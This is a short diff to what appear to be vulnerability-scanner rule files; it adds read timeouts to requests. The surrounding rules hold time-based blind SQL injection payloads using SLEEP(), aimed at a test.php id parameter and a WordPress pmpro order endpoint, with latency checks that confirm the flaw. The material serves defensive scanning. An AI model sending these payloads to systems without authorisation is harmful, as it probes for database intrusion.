@@ -811,12 +811,14 @@ rules:
     request:
       cache: true
       method: GET
+      read_timeout: "10"
       path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond1}}))))%23
     expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000
   r2:
     request:
       cache: true
       method: GET
+      read_timeout: "10"
       path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond2}}))))%23
     expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000
 expression: r0() && r1() && r2()
@@ -848,12 +850,14 @@ rules:
     request:
       cache: true
       method: GET
+      read_timeout: "10"
       path: /?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP({{sleepSecond}})))a)--%20-
     expression: response.latency - r0latency >= sleepSecond * 1000 - 500
   r2:
     request:
       cache: true
       method: GET
+      read_timeout: "10"
       path: /?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP({{sleepSecond1}})))a)--%20-
     expression: response.latency - r0latency >= sleepSecond1 * 1000 - 500
 expression: r0() && r1() && r2()
